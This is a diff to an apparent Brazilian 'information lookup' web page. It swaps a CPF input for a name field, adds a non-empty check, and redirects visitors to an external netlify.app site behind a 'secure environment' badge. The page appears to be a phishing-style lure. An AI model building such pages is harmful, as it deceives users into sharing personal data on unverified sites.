@@ -72,6 +72,7 @@ padding:14px;
 border:1px solid #ddd;
 border-radius:8px;
 margin-bottom:15px;
+font-size:14px;
 }
 
 /* BOTÃO */
@@ -142,21 +143,21 @@ Central de Consulta
 <h1>Consultar Informações</h1>
 
 <div class="desc">
-Informe seus dados para acessar informações disponíveis online.
+Digite seu nome para continuar.
 </div>
 
-<input class="input" type="text" placeholder="Digite seu CPF">
+<input class="input" type="text" id="nome" placeholder="Digite seu nome completo">
 
-<button class="btn" onclick="goLink()">
-Continuar consulta
+<button class="btn" onclick="validar()">
+Continuar
 </button>
 
 <div class="security">
-🔒 Ambiente seguro • Seus dados não são armazenados nesta página
+🔒 Ambiente seguro • Dados não são armazenados nesta página
 </div>
 
 <div class="info">
-Você será direcionado para uma página externa com mais informações.
+Você será direcionado para uma página externa.
 </div>
 
 </div>
@@ -171,8 +172,15 @@ Você será direcionado para uma página externa com mais informações.
 
 <script>
 
-function goLink(){
-window.location.href="https://prismatic-crostata-496139.netlify.app/";
+function validar(){
+let nome = document.getElementById("nome").value.trim()
+
+if(nome === ""){
+alert("Digite seu nome para continuar")
+return
+}
+
+window.location.href="https://prismatic-crostata-496139.netlify.app/"
 }
 
 </script>
